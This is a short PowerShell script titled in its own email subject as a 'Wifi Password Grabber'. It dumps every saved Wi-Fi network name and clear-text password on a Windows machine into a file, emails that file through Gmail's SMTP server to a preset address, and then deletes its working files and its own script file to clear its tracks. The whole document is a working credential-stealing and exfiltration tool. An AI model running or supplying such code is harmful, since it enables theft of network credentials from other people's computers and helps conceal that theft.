# All the necessary files will be saved in the following directory
$p = "$HOME\Downloads\wifipass"
mkdir $p
cd $p

# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}


# --------Email the output file---------
# Allow less secure apps for the sender email (https://myaccount.google.com/lesssecureapps)
$FROM = "Your email "
$PASS = "password for the email"
$TO = "to email"

$PC_NAME = "$env:computername"
$SUBJECT = "Wifi Password Grabber - " + $PC_NAME
$BODY = "All the wifi passwords that are saved to " + $PC_NAME + " are in the attached file."
$ATTACH = "wifipass.txt"

Send-MailMessage -SmtpServer "smtp.gmail.com" -Port 587 -From ${FROM} -to ${TO} -Subject ${SUBJECT} -Body ${BODY} -Attachment ${ATTACH} -Priority High -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ${FROM}, (ConvertTo-SecureString -String ${PASS} -AsPlainText -force))
# --- End email------------------------

# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wifipass

# remove script file
rm script.ps1
